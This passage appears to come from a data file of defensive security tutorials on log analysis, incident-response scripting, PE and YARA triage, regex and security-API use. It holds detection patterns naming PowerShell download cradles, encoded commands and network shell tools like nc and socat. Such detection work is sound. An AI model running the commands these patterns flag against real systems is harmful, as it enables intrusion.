        [PSCustomObject]@{
            Time    = $_.TimeCreated
            Snippet = $_.Message.Substring(0, [Math]::Min(300, $_.Message.Length))
        }
    } | Format-List
```

## Brute Force Detection

```powershell
# Group failed logons by source IP
$failures = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-1)
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $d   = $xml.Event.EventData.Data
    [PSCustomObject]@{
        Account = ($d | Where-Object {$_.Name -eq 'TargetUserName'}).'#text'
        SrcIP   = ($d | Where-Object {$_.Name -eq 'IpAddress'}).'#text'
    }
}

# Top attacking IPs
$failures | Group-Object SrcIP | Sort-Object Count -Descending |
    Where-Object {$_.Count -gt 10} | Select-Object Count, Name

# Targeted accounts
$failures | Group-Object Account | Sort-Object Count -Descending |
    Where-Object {$_.Count -gt 5} | Select-Object Count, Name
```

## Remote Analysis with Invoke-Command

```powershell
$computers = @('server01', 'server02', 'workstation10')

# Run checks on multiple endpoints in parallel
$jobs = $computers | ForEach-Object {
    $c = $_
    Start-Job -ScriptBlock {
        param($computer)
        Invoke-Command -ComputerName $computer -ScriptBlock {
            # Check for processes running from user-writable paths
            Get-Process | Where-Object {
                $_.Path -match 'Temp|AppData|Downloads'
            } | Select-Object Name, Id, CPU, Path,
                @{N='Computer';E={$env:COMPUTERNAME}}
        }
    } -ArgumentList $c
}
$jobs | Wait-Job | Receive-Job | Sort-Object CPU -Descending
```

## Exporting Results

```powershell
# CSV for spreadsheet analysis
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 1000 |
    Select-Object TimeCreated, Message |
    Export-Csv -Path C:\Reports\process_events.csv -NoTypeInformation

# JSON for SIEM ingestion
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 500 |
    Select-Object TimeCreated, Id, Message |
    ConvertTo-Json | Out-File C:\Reports\failed_logons.json

# HTML report
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 |
    ConvertTo-Html -Title "Top CPU Processes" |
    Out-File C:\Reports\top_processes.html
```
""",
    },
    {
        "title": "Bash Scripting for Incident Response — Log Analysis and Timeline Building",
        "tags": ["bash", "linux", "incident-response", "log-analysis", "timeline", "scripting"],
        "content": r"""# Bash Scripting for Incident Response — Log Analysis and Timeline Building

## Bash as an IR Tool

During Linux incident response, bash is often the only tool available. Mastering text processing pipelines lets analysts rapidly triage compromised systems without installing anything.

## Core Text Processing Tools

```bash
# grep — search with regex
grep "Failed password" /var/log/auth.log
grep -E "Failed|Invalid" /var/log/auth.log   # Extended regex
grep -P "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" /var/log/syslog  # PCRE

# awk — field extraction
awk '{print $1, $2, $3}' /var/log/syslog          # Fields 1-3
awk -F: '{print $1}' /etc/passwd                   # Colon-delimited field 1
awk 'NR>=10 && NR<=20' /var/log/auth.log           # Lines 10-20
awk '{sum+=$NF} END {print sum}' bytes.log         # Sum last column

# sed — stream editing
sed 's/ERROR/ALERT/g' app.log                      # Replace all
sed '/^#/d' config.conf                            # Delete comment lines
sed -n '/2026-03-15/p' app.log                     # Print matching lines

# sort | uniq — frequency analysis (the most important IR one-liner pattern)
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# cut — column extraction
cut -d' ' -f1 /var/log/nginx/access.log            # First field (IP)
cut -d: -f1,3 /etc/passwd                          # Fields 1 and 3
```

## Authentication Log Analysis

```bash
# SSH brute force — top attacking IPs
grep "Failed password" /var/log/auth.log |
    awk '{print $(NF-3)}' |
    sort | uniq -c | sort -rn | head -20

# All successful SSH logins with source IP
grep "Accepted" /var/log/auth.log |
    awk '{printf "%s %s %s | user:%s from:%s\n", $1,$2,$3,$9,$11}'

# sudo commands executed today
grep "COMMAND" /var/log/auth.log | grep "$(date '+%b %e')" |
    awk '{print $1,$2,$3,$NF}' | sort

# Failed su attempts
grep "FAILED su" /var/log/auth.log

# New user accounts created
grep "useradd\|adduser" /var/log/auth.log
grep "new user" /var/log/auth.log
```

## Web Server Log Analysis

```bash
# Top 20 IPs by request count
awk '{print $1}' /var/log/nginx/access.log |
    sort | uniq -c | sort -rn | head -20

# Top 404 paths (scanning/enumeration)
awk '$9 == 404 {print $7}' /var/log/nginx/access.log |
    sort | uniq -c | sort -rn | head -20

# Suspicious User-Agent strings
awk -F'"' '{print $6}' /var/log/nginx/access.log |
    grep -iE "sqlmap|nikto|nmap|masscan|zgrab|nuclei|hydra|acunetix" |
    sort | uniq -c | sort -rn

# Large responses (potential data exfiltration)
awk '{if ($10+0 > 1000000) print $1, $7, $10}' /var/log/nginx/access.log |
    sort -k3 -rn | head -10

# HTTP POST requests to unusual paths
awk '$6 ~ /POST/ && $7 !~ /^\/api\// {print $1, $7, $9}' /var/log/nginx/access.log |
    sort | uniq -c | sort -rn | head -20
```

## Building a Unified Timeline

```bash
#!/bin/bash
# build_ir_timeline.sh — unified security timeline for a given date

DATE="${1:-$(date +%Y-%m-%d)}"
OUTPUT="/tmp/ir_timeline_${DATE}.txt"

echo "Building IR timeline for $DATE -> $OUTPUT"

{
    echo "=== AUTH EVENTS ($DATE) ==="
    grep "$DATE" /var/log/auth.log 2>/dev/null |
        grep -E "Accepted|Failed password|sudo.*COMMAND|useradd|userdel" |
        awk '{printf "%s %s %s | %s\n", $1,$2,$3, substr($0, index($0,$4))}'

    echo ""
    echo "=== CRON EXECUTIONS ($DATE) ==="
    grep "$DATE" /var/log/syslog 2>/dev/null | grep "CRON\|crontab"

    echo ""
    echo "=== PACKAGE CHANGES ($DATE) ==="
    # Debian/Ubuntu
    grep "$DATE" /var/log/dpkg.log 2>/dev/null | grep -E "install|remove|upgrade"
    # RHEL/CentOS
    grep "$DATE" /var/log/yum.log 2>/dev/null

    echo ""
    echo "=== KERNEL MESSAGES ($DATE) ==="
    journalctl -k --since "$DATE 00:00:00" --until "$DATE 23:59:59" 2>/dev/null |
        grep -iE "error|warn|segfault|oom"

    echo ""
    echo "=== SYSTEMD SERVICE CHANGES ($DATE) ==="
    journalctl --since "$DATE 00:00:00" --until "$DATE 23:59:59" 2>/dev/null |
        grep -E "Started|Stopped|Failed|systemctl"

} > "$OUTPUT"

# Sort by timestamp (assuming syslog format: Mon DD HH:MM:SS)
sort -k1,1M -k2,2n -k3,3 "$OUTPUT" > "${OUTPUT%.txt}_sorted.txt"
echo "Sorted timeline: ${OUTPUT%.txt}_sorted.txt"
wc -l "${OUTPUT%.txt}_sorted.txt"
```

## Filesystem Timeline

```bash
# Files modified in last 24 hours — incident scope
find / -xdev -mtime -1 -printf "%TY-%Tm-%Td %TH:%TM:%TS %p\n" 2>/dev/null |
    sort > /tmp/recently_modified.txt

# Files created/modified in a specific incident window
find /home /tmp /var /etc /usr/local/bin \
    -newermt "2026-03-10 08:00:00" ! -newermt "2026-03-10 14:00:00" \
    -ls 2>/dev/null | sort -k8,9

# Suspicious: executable files in /tmp or /dev/shm
find /tmp /dev/shm /var/tmp -type f -executable 2>/dev/null

# SUID/SGID files (privilege escalation check — compare against baseline)
find / -xdev \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null

# World-writable directories (malware staging)
find / -xdev -type d -perm -0002 ! -perm -1000 -ls 2>/dev/null
```

## IOC Hunting

```bash
#!/bin/bash
# Quick IOC hunt for an IP address

IOC_IP="$1"
[ -z "$IOC_IP" ] && { echo "Usage: $0 <ip>"; exit 1; }

echo "Hunting for IOC: $IOC_IP"

echo "[*] Current network connections:"
ss -tn 2>/dev/null | grep "$IOC_IP"

echo "[*] Recent log references:"
grep -r "$IOC_IP" /var/log/ 2>/dev/null | tail -20

echo "[*] DNS lookups for this IP:"
grep "$IOC_IP" /var/log/syslog 2>/dev/null | grep -i dns | tail -10

echo "[*] Processes with connections to this IP:"
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
    if ss -tp -p 2>/dev/null | grep "pid=$pid," | grep -q "$IOC_IP"; then
        echo "  PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')"
    fi
done
```

## System State Snapshot (First 5 Minutes of IR)

```bash
#!/bin/bash
# ir_snapshot.sh — capture volatile state before it changes
OUTDIR="/tmp/ir_snapshot_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "Capturing system state to $OUTDIR"

date -u                         > "$OUTDIR/timestamp.txt"
uname -a                       >> "$OUTDIR/timestamp.txt"
w                               > "$OUTDIR/logged_in_users.txt"
last -20                       >> "$OUTDIR/logged_in_users.txt"
ps auxwww                       > "$OUTDIR/processes.txt"
ss -tulpn                       > "$OUTDIR/listening_ports.txt"
ss -tn                          > "$OUTDIR/established_connections.txt"
ls -lat /tmp /dev/shm /var/tmp  > "$OUTDIR/temp_dirs.txt"
find /tmp /dev/shm -type f -ls >> "$OUTDIR/temp_dirs.txt" 2>/dev/null
cat /etc/crontab                > "$OUTDIR/crontab_etc.txt"
for u in $(cut -f1 -d: /etc/passwd); do
    crontab -l -u "$u" 2>/dev/null | grep -v '^#' | grep -v '^$' |
        awk -v usr="$u" '{print usr": "$0}' >> "$OUTDIR/user_crontabs.txt"
done
systemctl list-units --type=service --state=running > "$OUTDIR/running_services.txt"
lsmod                           > "$OUTDIR/kernel_modules.txt"
df -h                           > "$OUTDIR/disk_usage.txt"
for pid in $(ls /proc | grep -E "^[0-9]+$"); do
    exe=$(readlink /proc/$pid/exe 2>/dev/null)
    [[ "$exe" == *"(deleted)"* ]] && echo "PID $pid DELETED_EXE: $exe"
done                            > "$OUTDIR/deleted_executables.txt"

echo "Snapshot complete: $OUTDIR"
tar czf "${OUTDIR}.tar.gz" "$OUTDIR/"
echo "Archive: ${OUTDIR}.tar.gz"
```
""",
    },
    {
        "title": "Python for Security — requests, scapy, pefile, and yara-python",
        "tags": ["python", "security", "scripting", "scapy", "yara", "pefile", "automation"],
        "content": r"""# Python for Security — requests, scapy, pefile, and yara-python

## Python's Security Toolkit

Python dominates security scripting because of its rich ecosystem, readable syntax, and cross-platform support. These four libraries cover network HTTP interaction, packet analysis, PE binary analysis, and pattern-based malware detection.

## requests — HTTP API Integration

```python
import requests
import time
import logging
from typing import Iterator

logger = logging.getLogger(__name__)

class SecurityAPIClient:
    \"\"\"Reusable API client with retry, rate limiting, and error handling.\"\"\"

    def __init__(self, base_url: str, api_key: str, verify_ssl: bool = True):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json',
            'User-Agent': 'ION-SOC/1.0',
        })
        self.session.verify = verify_ssl

    def get(self, endpoint: str, params: dict = None, retries: int = 3) -> dict:
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        for attempt in range(retries):
            try:
                r = self.session.get(url, params=params, timeout=30)
                if r.status_code == 429:
                    wait = int(r.headers.get('Retry-After', 60))
                    logger.warning("Rate limited; sleeping %ds", wait)
                    time.sleep(wait)
                    continue
                r.raise_for_status()
                return r.json()
            except requests.ConnectionError:
                if attempt == retries - 1:
                    raise
                time.sleep(2 ** attempt)
        raise RuntimeError(f"Failed after {retries} retries: {url}")

    def post(self, endpoint: str, data: dict) -> dict:
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        r = self.session.post(url, json=data, timeout=30)
        r.raise_for_status()
        return r.json()

    def paginate(self, endpoint: str, page_size: int = 100) -> Iterator[dict]:
        \"\"\"Walk paginated API responses.\"\"\"
        page = 1
        while True:
            result = self.get(endpoint, params={'page': page, 'per_page': page_size})
            items = result.get('data', result.get('items', result.get('results', [])))
            if not items:
                break
            yield from items
            if len(items) < page_size:
                break
            page += 1


def check_virustotal(file_hash: str, api_key: str) -> dict:
    r = requests.get(
        f"https://www.virustotal.com/api/v3/files/{file_hash}",
        headers={"x-apikey": api_key},
        timeout=10
    )
    r.raise_for_status()
    stats = r.json()['data']['attributes']['last_analysis_stats']
    return {
        'hash': file_hash,
        'malicious': stats.get('malicious', 0),
        'total': sum(stats.values()),
        'verdict': 'MALICIOUS' if stats.get('malicious', 0) > 3 else 'CLEAN',
    }
```

## scapy — Packet Analysis

```python
from scapy.all import rdpcap, DNSQR, IP, TCP, UDP, Raw

def analyze_pcap(filepath: str) -> dict:
    \"\"\"Extract security-relevant observations from a PCAP.\"\"\"
    packets = rdpcap(filepath)
    results = {
        'total_packets': len(packets),
        'dns_queries': [],
        'cleartext_credentials': [],
        'suspicious_payloads': [],
    }

    for pkt in packets:
        # DNS queries
        if pkt.haslayer(DNSQR):
            query = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
            src   = pkt[IP].src if pkt.haslayer(IP) else 'unknown'
            results['dns_queries'].append({'src': src, 'query': query})

        # Cleartext credentials in TCP streams
        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            payload = pkt[Raw].load
            if any(kw in payload for kw in [b'USER ', b'PASS ', b'password=']):
                results['cleartext_credentials'].append({
                    'src': pkt[IP].src if pkt.haslayer(IP) else '?',
                    'dst': pkt[IP].dst if pkt.haslayer(IP) else '?',
                    'port': pkt[TCP].dport,
                    'snippet': payload[:100].hex(),
                })

        # PE header in transit (executable download)
        if pkt.haslayer(Raw):
            if pkt[Raw].load[:2] == b'MZ':
                results['suspicious_payloads'].append('PE_HEADER_IN_TRANSIT')

    # Long DNS queries (tunneling indicator)
    results['long_dns_queries'] = [
        q for q in results['dns_queries'] if len(q['query']) > 50
    ]

    return results
```

## pefile — Windows PE Binary Analysis

```python
import pefile
import hashlib
import datetime

def analyze_pe(filepath: str) -> dict:
    \"\"\"Analyze a Windows PE file for suspicious indicators.\"\"\"
    pe = pefile.PE(filepath)
    result = {'file': filepath, 'indicators': []}

    # Compile timestamp
    compile_time = datetime.datetime.utcfromtimestamp(pe.FILE_HEADER.TimeDateStamp)
    result['compile_time'] = compile_time.isoformat()
    if compile_time > datetime.datetime.utcnow():
        result['indicators'].append('FUTURE_COMPILE_TIMESTAMP')

    # Imports
    suspicious_imports = {
        'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread',
        'URLDownloadToFile', 'WinExec', 'ShellExecuteA',
    }
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name and imp.name.decode('utf-8', errors='ignore') in suspicious_imports:
                    result['indicators'].append(
                        f"SUSPICIOUS_IMPORT:{imp.name.decode('utf-8', errors='ignore')}"
                    )

    # Section entropy (packed/encrypted = high entropy)
    result['sections'] = []
    for section in pe.sections:
        name    = section.Name.decode('utf-8', errors='ignore').rstrip('\\x00')
        entropy = section.get_entropy()
        result['sections'].append({'name': name, 'entropy': round(entropy, 2)})
        if entropy > 7.0:
            result['indicators'].append(f'HIGH_ENTROPY:{name}({entropy:.2f})')

    pe.close()

    # Hashes
    with open(filepath, 'rb') as f:
        data = f.read()
    result['sha256'] = hashlib.sha256(data).hexdigest()
    result['md5']    = hashlib.md5(data).hexdigest()

    return result
```

## yara-python — Pattern-Based Detection

```python
import yara

RULE_SOURCE = r\"\"\"
rule SuspiciousDownloader {
    meta:
        description = "Common downloader patterns"
        severity    = "high"
    strings:
        $ps_enc    = /powershell.*-[eE]nc/               nocase
        $dl_string = "DownloadString"                    nocase
        $webclient = "WebClient"                         nocase
        $iex       = "IEX"                               nocase
        $b64       = /[A-Za-z0-9+\\/]{100,}={0,2}/
    condition:
        $ps_enc or ($iex and ($dl_string or $webclient)) or (2 of ($dl_string,$webclient) and $b64)
}

rule PEInMemory {
    meta:
        description = "PE header found in unexpected location"
    strings:
        $mz = { 4D 5A }
        $pe = { 50 45 00 00 }
    condition:
        $mz at 0 and $pe
}
\"\"\"

rules = yara.compile(source=RULE_SOURCE)

def scan_file(filepath: str) -> list:
    matches = rules.match(filepath)
    return [{'rule': m.rule, 'meta': m.meta,
             'strings': [(s.offset, s.identifier) for s in m.strings]}
            for m in matches]

def scan_process_memory(pid: int) -> list:
    try:
        matches = rules.match(pid=pid)
        return [{'rule': m.rule, 'meta': m.meta} for m in matches]
    except yara.Error as e:
        return [{'error': str(e)}]

# Scan all running processes for YARA hits
import psutil
for proc in psutil.process_iter(['pid', 'name']):
    hits = scan_process_memory(proc.info['pid'])
    if hits:
        print(f"YARA HIT: PID {proc.info['pid']} ({proc.info['name']}): {hits}")
```

## Integrated Triage Script

```python
#!/usr/bin/env python3
\"\"\"Quick triage: hashes + PE analysis + YARA scan + optional VT lookup.\"\"\"

import sys
import json
import hashlib

def triage(filepath: str, vt_api_key: str = None) -> dict:
    report = {'file': filepath}

    with open(filepath, 'rb') as f:
        data = f.read()
    report['md5']    = hashlib.md5(data).hexdigest()
    report['sha256'] = hashlib.sha256(data).hexdigest()

    if data[:2] == b'MZ':
        try:
            report['pe'] = analyze_pe(filepath)
        except Exception as e:
            report['pe_error'] = str(e)

    report['yara'] = scan_file(filepath)

    if vt_api_key:
        try:
            report['virustotal'] = check_virustotal(report['sha256'], vt_api_key)
        except Exception as e:
            report['virustotal'] = {'error': str(e)}

    indicators = len(report.get('pe', {}).get('indicators', []))
    yara_hits  = len(report['yara'])
    vt_mal     = report.get('virustotal', {}).get('malicious', 0)

    if vt_mal > 5 or yara_hits > 0 or indicators > 3:
        report['verdict'] = 'MALICIOUS'
    elif vt_mal > 0 or indicators > 1:
        report['verdict'] = 'SUSPICIOUS'
    else:
        report['verdict'] = 'CLEAN'

    return report

if __name__ == '__main__':
    key = sys.argv[2] if len(sys.argv) > 2 else None
    print(json.dumps(triage(sys.argv[1], key), indent=2))
```
""",
    },
    {
        "title": "Regular Expressions Masterclass for Log Analysis",
        "tags": ["regex", "log-analysis", "grep", "python", "siem", "scripting"],
        "content": r"""# Regular Expressions Masterclass for Log Analysis

## Why Regex is Essential for Security

Log analysis without regular expressions is like searching a library with no index. SIEM detection rules, grep hunts, Python parsers, and Grok patterns all use regex as their core language.

## Syntax Reference

```
Character Classes:
.        Any character (except newline)
\\w       Word char: [a-zA-Z0-9_]
\\d       Digit: [0-9]
\\s       Whitespace (space, tab, newline)
[abc]    Matches a, b, or c
[^abc]   Anything except a, b, c
[a-z]    Character range

Quantifiers:
*        Zero or more (greedy)
+        One or more (greedy)
?        Zero or one (optional)
{n}      Exactly n
{n,m}    Between n and m
*?  +?   Non-greedy variants

Anchors:
^        Start of line
$        End of line
\\b       Word boundary

Groups:
(abc)    Capturing group
(?:abc)  Non-capturing group
a|b      Alternation
(?P<name>...) Named capture group (Python)

Lookarounds (PCRE/Python):
(?=abc)  Positive lookahead
(?!abc)  Negative lookahead
(?<=abc) Positive lookbehind
(?<!abc) Negative lookbehind
```

## Security Regex Patterns

```python
import re

# IP addresses
IPV4        = r'\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b'
IPV4_LOOSE  = r'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b'
PRIVATE_IP  = r'^(10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.)'

# Hashes
MD5    = r'\\b[a-fA-F0-9]{32}\\b'
SHA1   = r'\\b[a-fA-F0-9]{40}\\b'
SHA256 = r'\\b[a-fA-F0-9]{64}\\b'

# Indicators
EMAIL       = r'\\b[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}\\b'
URL         = r'https?://[^\\s"\'<>]+'
CVE         = r'CVE-\\d{4}-\\d{4,7}'
BASE64_LONG = r'[A-Za-z0-9+/]{60,}={0,2}'

# PowerShell encoded command
PS_ENCODED = r'-[eE](?:nc(?:odedCommand)?)?\\s+([A-Za-z0-9+/]{20,}={0,2})'

# Extract all IPs from text
text = "Attack from 203.0.113.5, pivot to 10.0.0.20, callback to 192.168.1.100"
ips = re.findall(IPV4_LOOSE, text)
# ['203.0.113.5', '10.0.0.20', '192.168.1.100']
```

## Log Parsing Patterns

```python
# Apache/Nginx Combined Log Format
APACHE_LOG = re.compile(
    r'(?P<client>\\S+) \\S+ \\S+ \\[(?P<time>[^\\]]+)\\] '
    r'"(?P<method>\\w+) (?P<path>\\S+) [^"]+" '
    r'(?P<status>\\d{3}) (?P<size>\\d+|-) '
    r'"(?P<referrer>[^"]*)" "(?P<ua>[^"]*)"'
)

# SSH auth.log
SSH_FAIL   = re.compile(r'Failed password for (?:invalid user )?(?P<user>\\S+) from (?P<ip>\\S+)')
SSH_ACCEPT = re.compile(r'Accepted (?:password|publickey) for (?P<user>\\S+) from (?P<ip>\\S+)')

# Windows Event Log field extraction (from .Message text)
WIN_ACCOUNT = re.compile(r'Account Name:\\s+(?P<account>[^\\r\\n]+)')
WIN_SRC_IP  = re.compile(r'Source Network Address:\\s+(?P<ip>[^\\r\\n]+)')

# Parse access log and find scanners
def find_scanners(logfile: str, threshold: int = 100) -> list:
    ip_404 = {}
    with open(logfile) as f:
        for line in f:
            m = APACHE_LOG.search(line)
            if m and m.group('status') == '404':
                ip = m.group('client')
                ip_404[ip] = ip_404.get(ip, 0) + 1
    return [(ip, count) for ip, count in ip_404.items() if count >= threshold]
```

## Decode Base64 from PowerShell Logs

```python
import base64

def decode_ps_base64(log_line: str) -> str:
    \"\"\"Extract and decode base64-encoded PowerShell command.\"\"\"
    m = re.search(PS_ENCODED, log_line)
    if not m:
        return None
    try:
        return base64.b64decode(m.group(1)).decode('utf-16-le', errors='ignore')
    except Exception:
        return '[decode failed]'

# Example
line = 'powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdA=='
decoded = decode_ps_base64(line)
print(decoded)  # $c=New-Object System.Net.WebClient
```

## IOC Extraction from Threat Reports

```python
def extract_iocs(text: str) -> dict:
    \"\"\"Extract all observable IOC types from free-form text.\"\"\"
    return {
        'ips':    sorted(set(re.findall(IPV4_LOOSE, text))),
        'md5s':   sorted(set(re.findall(MD5, text, re.I))),
        'sha256': sorted(set(re.findall(SHA256, text, re.I))),
        'cves':   sorted(set(re.findall(CVE, text))),
        'emails': sorted(set(re.findall(EMAIL, text, re.I))),
        'urls':   sorted(set(re.findall(URL, text))),
    }
```

## grep Cheatsheet for Log Hunting

```bash
# grep modes
grep -E "pattern"    # Extended regex — no backslash for +, |, (, )
grep -P "pattern"    # PCRE — supports \\d, \\w, lookarounds
grep -i "pattern"    # Case insensitive
grep -v "pattern"    # Invert match (exclusion)
grep -o "pattern"    # Print only matched portion
grep -n "pattern"    # Show line numbers
grep -c "pattern"    # Count matching lines
grep -r "pattern" .  # Recursive directory search

# Security hunting one-liners
# Encoded PowerShell
grep -P "-[eE](?:nc)?\\s+[A-Za-z0-9+/]{20,}" /var/log/audit/audit.log

# Cleartext passwords in web logs
grep -iP "(passw(or)?d|passwd|credentials?)\\s*[=:]\\s*\\S+" access.log

# Suspicious process names in auth log
grep -P "\\b(nc|ncat|socat|bash|sh|python|perl|ruby)\\b" /var/log/auth.log |
    grep "spawned\\|executed"

# Top source IPs in auth.log failures
grep -oP "(?<=from )\\d{1,3}(?:\\.\\d{1,3}){3}" /var/log/auth.log |
    sort | uniq -c | sort -rn | head -20
```

## Elasticsearch / Kibana Regex

```json
// KQL (Kibana Query Language) — basic glob/regex
process.command_line : "*powershell* -enc *"

// Lucene regex in query_string
{
  "query": {
    "regexp": {
      "process.command_line": ".*-[eE]nc\\\\s+[A-Za-z0-9+/]{20,}.*"
    }
  }
}

// Painless script for complex matching
{
  "query": {
    "script": {
      "script": {
        "source": "doc['process.command_line.keyword'].value =~ /.*IEX.*DownloadString.*/",
        "lang": "painless"
      }
    }
  }
}
```
""",
    },
    {
        "title": "REST API Consumption for Security Tools — curl and Python requests",
        "tags": ["api", "rest", "curl", "python", "integration", "scripting", "soc"],
        "content": r"""# REST API Consumption for Security Tools — curl and Python requests

## APIs in the SOC

Modern security tools expose REST APIs: VirusTotal, MISP, OpenCTI, Elastic/Splunk, SOAR platforms, Jira, and firewall management consoles. API fluency enables enrichment automation, bidirectional integrations, and custom response workflows.

## curl — Rapid API Exploration

```bash
# Basic GET
curl -s https://api.example.com/v1/alerts

# Bearer token authentication
curl -s -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/alerts

# API key header (VirusTotal style)
curl -s -H "x-apikey: $VT_KEY" \
    "https://www.virustotal.com/api/v3/files/$SHA256"

# POST with JSON body
curl -s -X POST https://api.example.com/v1/cases \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"title": "Incident 2026-001", "severity": "high"}'

# POST from file
curl -s -X POST https://api.example.com/v1/iocs/bulk \
    -H "Content-Type: application/json" \
    -d @iocs.json

# Pretty-print JSON response
curl -s https://api.example.com/v1/alerts | jq '.'
curl -s https://api.example.com/v1/alerts | jq '.data[].attributes.severity'

# Check HTTP status only (no body output)
curl -s -o /dev/null -w "%{http_code}" https://api.example.com/health

# Basic auth
curl -s -u username:password https://api.example.com/v1/resource

# Mutual TLS (client certificate)
curl -s --cert client.crt --key client.key https://api.example.com/v1/resource

# Follow redirects, show response headers
curl -sL -D - https://api.example.com/v1/alerts -o /dev/null
```

## Elasticsearch REST API (Common SOC Queries)

```bash
ES="https://127.0.0.1:9200"
AUTH="elastic:YourPassword"

# Cluster health
curl -s -u "$AUTH" "$ES/_cluster/health?pretty"

# Search last hour of security alerts
curl -s -X GET -u "$AUTH" "$ES/.alerts-*/_search?pretty" \
    -H "Content-Type: application/json" -d '{
  "query": {"range": {"@timestamp": {"gte": "now-1h"}}},
  "sort": [{"@timestamp": {"order": "desc"}}],
  "size": 20,
  "_source": ["@timestamp","kibana.alert.rule.name","kibana.alert.severity"]
}'

# Count alerts by severity in last 24h
curl -s -X GET -u "$AUTH" "$ES/.alerts-*/_search?pretty" \
    -H "Content-Type: application/json" -d '{
  "size": 0,
  "query": {"range": {"@timestamp": {"gte": "now-24h"}}},
  "aggs": {
    "by_severity": {
      "terms": {"field": "kibana.alert.severity"}
    }
  }
}'

# Update alert to closed
curl -s -X POST -u "$AUTH" "$ES/.alerts-*/_update_by_query" \
    -H "Content-Type: application/json" -d '{
  "query": {"term": {"_id": "ALERT_ID_HERE"}},
  "script": {
    "source": "ctx._source[\"kibana.alert.workflow_status\"] = \"closed\"",
    "lang": "painless"
  }
}'
```

## Python requests — Production Integration

```python
import requests
import time
import logging
from typing import Any, Iterator

logger = logging.getLogger(__name__)

class APIClient:
    \"\"\"Production-grade REST client with retry, rate-limit handling, and pagination.\"\"\"

    def __init__(self, base_url: str, api_key: str = None,
                 username: str = None, password: str = None,
                 verify_ssl: bool = True):
        self.base_url = base_url.rstrip('/')
        self.session  = requests.Session()
        self.session.verify = verify_ssl

        if api_key:
            self.session.headers['Authorization'] = f'Bearer {api_key}'
        elif username and password:
            self.session.auth = (username, password)

        self.session.headers['Content-Type'] = 'application/json'

    def _request(self, method: str, endpoint: str, retries: int = 3, **kwargs) -> Any:
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        for attempt in range(retries):
            try:
                r = self.session.request(method, url, timeout=30, **kwargs)
                if r.status_code == 429:
                    wait = int(r.headers.get('Retry-After', 60))
                    logger.warning("Rate limited; retry in %ds", wait)
                    time.sleep(wait)
                    continue
                r.raise_for_status()
                return r.json() if r.content else {}
            except requests.ConnectionError:
                if attempt == retries - 1:
                    raise
                time.sleep(2 ** attempt)
        raise RuntimeError(f"Failed {method} {url} after {retries} retries")

    def get(self, endpoint: str, params: dict = None) -> Any:
        return self._request('GET', endpoint, params=params)

    def post(self, endpoint: str, data: dict) -> Any:
        return self._request('POST', endpoint, json=data)

    def paginate(self, endpoint: str, page_size: int = 100) -> Iterator[dict]:
        page = 1
        while True:
            result = self.get(endpoint, params={'page': page, 'per_page': page_size})
            items  = result.get('data', result.get('items', result.get('results', [])))
            if not items:
                break
            yield from items
            if len(items) < page_size:
                break
            page += 1


# MISP integration
class MISPClient(APIClient):
    def search_attribute(self, value: str) -> list:
        r = self.post('/attributes/restSearch', {
            'returnFormat': 'json', 'value': value
        })
        return r.get('response', {}).get('Attribute', [])

    def add_event(self, title: str, threat_level: int, attributes: list) -> dict:
        return self.post('/events/add', {
            'Event': {
                'info': title,
                'threat_level_id': str(threat_level),
                'analysis': '0',
                'distribution': '0',
                'Attribute': attributes,
            }
        })


# Bulk enrichment workflow
def enrich_ioc(indicator: str, vt_key: str, misp: MISPClient) -> dict:
    result = {'indicator': indicator, 'sources': {}}

    # VirusTotal
    try:
        r = requests.get(
            f"https://www.virustotal.com/api/v3/search?query={indicator}",
            headers={"x-apikey": vt_key}, timeout=10
        )
        result['sources']['virustotal'] = {
            'found': r.ok and len(r.json().get('data', [])) > 0
        }
    except Exception as e:
        result['sources']['virustotal'] = {'error': str(e)}

    # MISP
    try:
        hits = misp.search_attribute(indicator)
        result['sources']['misp'] = {
            'found': bool(hits),
            'events': list({a['event_id'] for a in hits}),
        }
    except Exception as e:
        result['sources']['misp'] = {'error': str(e)}

    any_found = any(s.get('found') for s in result['sources'].values())
    result['verdict'] = 'KNOWN_MALICIOUS' if any_found else 'UNKNOWN'
    return result
```

## Handling Pagination with ES Scroll

```python
def scroll_alerts(es_client: APIClient, index: str, query: dict):
    \"\"\"Retrieve all matching documents using ES scroll API.\"\"\"
    # Start scroll
    data = es_client.post(
        f"{index}/_search?scroll=2m",
        {**query, "size": 1000}
    )
    scroll_id = data.get('_scroll_id')
    hits      = data['hits']['hits']

    while hits:
        yield from hits
        data      = es_client.post('_search/scroll',
                                   {'scroll': '2m', 'scroll_id': scroll_id})
        scroll_id = data.get('_scroll_id')
        hits      = data['hits']['hits']
